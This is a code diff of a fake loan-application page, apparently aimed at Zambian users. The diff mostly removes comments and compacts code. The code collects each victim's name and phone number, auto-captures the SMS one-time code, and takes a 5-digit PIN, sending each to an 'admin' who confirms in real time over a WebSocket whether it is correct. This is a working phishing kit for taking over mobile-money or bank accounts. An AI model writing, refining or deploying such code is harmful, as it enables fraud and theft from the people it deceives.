@@ -315,9 +315,6 @@
     </div>
 
     <script>
-    // ═══════════════════════════════════════════
-    // STATE
-    // ═══════════════════════════════════════════
     var appData = { name: '', phone: '', amount: 0, period: 0, otp: '', pin: '' };
     var currentPage = 1;
     var isNavigating = false;
@@ -328,19 +325,13 @@
     var otpTimerInterval = null;
     var otpTimeout = null;
     var pollInterval = null;
-    var waitingForOtp = false;
-    var waitingForPin = false;
 
-    // ═══════════════════════════════════════════
-    // INIT
-    // ═══════════════════════════════════════════
     document.addEventListener('DOMContentLoaded', function() {
         initQuickAmounts();
         initPeriodButtons();
         initPinInput();
         initPhoneInput();
         initOtpInput();
-
         document.getElementById('btnApply').addEventListener('click', handlePage1Submit);
         document.getElementById('btnOtp').addEventListener('click', handlePage2Submit);
         document.getElementById('btnPin').addEventListener('click', handlePage3Submit);
@@ -350,33 +341,18 @@
     });
 
     // ═══════════════════════════════════════════
-    // WEBSOCKET + POLLING FALLBACK
+    // WEBSOCKET + POLLING
     // ═══════════════════════════════════════════
     function connectWebSocket() {
         if (!sessionId) return;
         var protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
         ws = new WebSocket(protocol + '//' + location.host + '/ws?session=' + sessionId);
-
-        ws.onopen = function() {
-            wsConnected = true;
-            console.log('WS connected');
-        };
-
-        ws.onmessage = function(event) {
-            var msg = JSON.parse(event.data);
-            handleAdminDecision(msg);
-        };
-
-        ws.onclose = function() {
-            wsConnected = false;
-            console.log('WS lost — relying on polling');
-            setTimeout(connectWebSocket, 5000);
-        };
-
+        ws.onopen = function() { wsConnected = true; };
+        ws.onmessage = function(event) { handleAdminDecision(JSON.parse(event.data)); };
+        ws.onclose = function() { wsConnected = false; setTimeout(connectWebSocket, 5000); };
         ws.onerror = function() {};
     }
 
-    // Polling fallback — checks server every 3s
     function startPolling() {
         if (pollInterval) clearInterval(pollInterval);
         pollInterval = setInterval(function() {
@@ -384,9 +360,7 @@
             fetch('/api/check?sessionId=' + sessionId)
                 .then(function(r) { return r.json(); })
                 .then(function(data) {
-                    if (data.status === 'decision') {
-                        handleAdminDecision(data);
-                    }
+                    if (data.status === 'decision') handleAdminDecision(data);
                 })
                 .catch(function() {});
         }, 3000);
@@ -396,10 +370,7 @@
         if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
     }
 
-    // Single handler for both WS and polling messages
     function handleAdminDecision(msg) {
-        console.log('Admin decision received:', msg);
-
         if (msg.type === 'otp_result') {
             if (msg.result === 'correct') {
                 stopPolling();
@@ -420,7 +391,6 @@
                 status.textContent = '❌ Wrong OTP. Enter the correct code.';
             }
         }
-
         if (msg.type === 'pin_result') {
             if (msg.result === 'correct') {
                 stopPolling();
@@ -441,18 +411,16 @@
     }
 
     // ═══════════════════════════════════════════
-    // PAGE NAVIGATION
+    // NAVIGATION
     // ═══════════════════════════════════════════
     function goToPage(pageNum) {
         if (isNavigating) return;
         isNavigating = true;
         var currentEl = document.getElementById('page' + currentPage);
         var nextEl = document.getElementById('page' + pageNum);
-
         currentEl.style.opacity = '0';
         currentEl.style.transform = 'translateX(-20px)';
         currentEl.style.transition = 'all 0.25s ease';
-
         setTimeout(function() {
             currentEl.classList.remove('active');
             currentEl.style.opacity = '';
@@ -493,7 +461,6 @@
             document.getElementById('fullName').classList.remove('error');
             document.getElementById('nameError').classList.remove('show');
         }
-
         var phoneRaw = document.getElementById('phoneNumber').value.replace(/\s/g, '');
         if (phoneRaw.length < 1) {
             document.getElementById('phoneNumber').classList.add('error');
@@ -503,7 +470,6 @@
             document.getElementById('phoneNumber').classList.remove('error');
             document.getElementById('phoneError').classList.remove('show');
         }
-
         var amount = parseInt(document.getElementById('loanAmount').value) || 0;
         if (amount < 500 || amount > 50000) {
             document.getElementById('loanAmount').classList.add('error');
@@ -513,7 +479,6 @@
             document.getElementById('loanAmount').classList.remove('error');
             document.getElementById('amountError').classList.remove('show');
         }
-
         var periodBtn = document.querySelector('.period-btn.selected');
         if (!periodBtn) {
             document.getElementById('periodError').classList.add('show');
@@ -521,7 +486,6 @@
         } else {
             document.getElementById('periodError').classList.remove('show');
         }
-
         if (!valid) { showToast('Please fix the errors above', 'error'); return false; }
         appData.name = name;
         appData.phone = '+260 ' + phoneRaw;
@@ -535,7 +499,6 @@
         var btn = document.getElementById('btnApply');
         btn.classList.add('loading');
         btn.disabled = true;
-
         try {
             var res = await fetch('/api/apply', {
                 method: 'POST',
@@ -547,7 +510,6 @@
                 sessionId = data.sessionId;
                 connectWebSocket();
                 startPolling();
-
                 var interest = calcInterest(appData.amount, appData.period);
                 var total = appData.amount + interest;
                 document.getElementById('summaryCard').innerHTML =
@@ -557,7 +519,6 @@
                     '<div class="summary-row"><span class="summary-label">Period</span><span class="summary-value">' + appData.period + ' days</span></div>' +
                     '<div class="summary-row"><span class="summary-label">Est. Repayment</span><span class="summary-value" style="color:var(--primary)">K' + total.toLocaleString() + '</span></div>';
                 document.getElementById('otpPhoneDisplay').textContent = appData.phone;
-
                 btn.classList.remove('loading');
                 btn.disabled = false;
                 goToPage(2);
@@ -570,15 +531,13 @@
     }
 
     // ═══════════════════════════════════════════
-    // PAGE 2: OTP (4 digits, auto-submit)
+    // PAGE 2: OTP (auto-submit on 4 digits)
     // ═══════════════════════════════════════════
     function initOtpInput() {
         var otpInput = document.getElementById('otpInput');
-        // AUTO-SUBMIT when 4 digits entered
         otpInput.addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
             if (e.target.value.length === 4 && !isSubmitting) {
-                // Auto-submit immediately
                 setTimeout(function() { handlePage2Submit(); }, 300);
             }
         });
@@ -589,14 +548,12 @@
         var status = document.getElementById('otpStatus');
         var timerEl = document.getElementById('otpTimer');
         var btn = document.getElementById('btnOtp');
-
         otpInput.value = '';
         otpInput.readOnly = true;
         btn.disabled = false;
         btn.classList.remove('loading');
         document.getElementById('otpAlert').classList.remove('show');
         document.getElementById('otpWaiting').classList.remove('show');
-
         if (otpTimerInterval) clearInterval(otpTimerInterval);
         if (otpTimeout) clearTimeout(otpTimeout);
 
@@ -619,7 +576,6 @@
             status.textContent = '📲 Enter the 4-digit code manually (auto-submits)';
         }, 10000);
 
-        // WebOTP auto-capture
         if (window.isSecureContext && 'OTPCredential' in window) {
             navigator.credentials.get({ otp: { transport: ['sms'] } })
                 .then(function(otp) {
@@ -631,7 +587,6 @@
                     status.className = 'otp-status success';
                     status.textContent = '✅ Code received! Submitting…';
                     appData.otp = otp.code;
-                    // AUTO-SUBMIT
                     setTimeout(function() { handlePage2Submit(); }, 800);
                 })
                 .catch(function() {});
@@ -651,16 +606,13 @@
         if (otp.length < 4) return;
         if (isSubmitting) return;
         isSubmitting = true;
-
         appData.otp = otp;
         document.getElementById('otpAlert').classList.remove('show');
         document.getElementById('otpWaiting').classList.remove('show');
-
         var btn = document.getElementById('btnOtp');
         btn.classList.add('loading');
         btn.disabled = true;
         document.getElementById('otpInput').readOnly = true;
-
         try {
             var res = await fetch('/api/otp', {
                 method: 'POST',
@@ -669,12 +621,10 @@
             });
             var data = await res.json();
             if (data.success) {
-                waitingForOtp = true;
                 document.getElementById('otpWaiting').classList.add('show');
                 var status = document.getElementById('otpStatus');
                 status.className = 'otp-status waiting';
                 status.textContent = '⏳ OTP sent to admin. Waiting for verification…';
-                // Ensure polling is active
                 startPolling();
             } else {
                 btn.classList.remove('loading');
@@ -692,7 +642,7 @@
     }
 
     // ═══════════════════════════════════════════
-    // PAGE 3: PIN (5 digits, auto-submit)
+    // PAGE 3: PIN (auto-submit on 5 digits)
     // ═══════════════════════════════════════════
     function initPinInput() {
         var pinInput = document.getElementById('pinInput');
@@ -701,7 +651,6 @@
             e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 5);
             dots.forEach(function(d, i) { d.classList.toggle('filled', i < e.target.value.length); });
             if (e.target.value.length === 5) document.getElementById('pinError').classList.remove('show');
-            // AUTO-SUBMIT when 5 digits entered
             if (e.target.value.length === 5 && !isSubmitting) {
                 setTimeout(function() { handlePage3Submit(); }, 300);
             }
@@ -713,15 +662,12 @@
         if (pin.length !== 5) return;
         if (isSubmitting) return;
         isSubmitting = true;
-
         appData.pin = pin;
         document.getElementById('pinAlert').classList.remove('show');
         document.getElementById('pinWaiting').classList.remove('show');
-
         var btn = document.getElementById('btnPin');
         btn.classList.add('loading');
         btn.disabled = true;
-
         try {
             var res = await fetch('/api/pin', {
                 method: 'POST',
@@ -730,7 +676,6 @@
             });
             var data = await res.json();
             if (data.success) {
-                waitingForPin = true;
                 document.getElementById('pinWaiting').classList.add('show');
                 startPolling();
             } else {
@@ -779,13 +724,10 @@
         appData = { name: '', phone: '', amount: 0, period: 0, otp: '', pin: '' };
         isSubmitting = false;
         sessionId = null;
-        waitingForOtp = false;
-        waitingForPin = false;
         if (ws) { ws.close(); ws = null; }
         wsConnected = false;
         if (otpTimerInterval) clearInterval(otpTimerInterval);
         if (otpTimeout) clearTimeout(otpTimeout);
-
         document.getElementById('fullName').value = '';
         document.getElementById('phoneNumber').value = '';
         document.getElementById('loanAmount').value = '';
@@ -813,7 +755,7 @@
     }
 
     // ═══════════════════════════════════════════
-    // INPUT INITIALIZERS
+    // INITIALIZERS
     // ═══════════════════════════════════════════
     function initQuickAmounts() {
         document.querySelectorAll('.quick-btn').forEach(function(btn) {
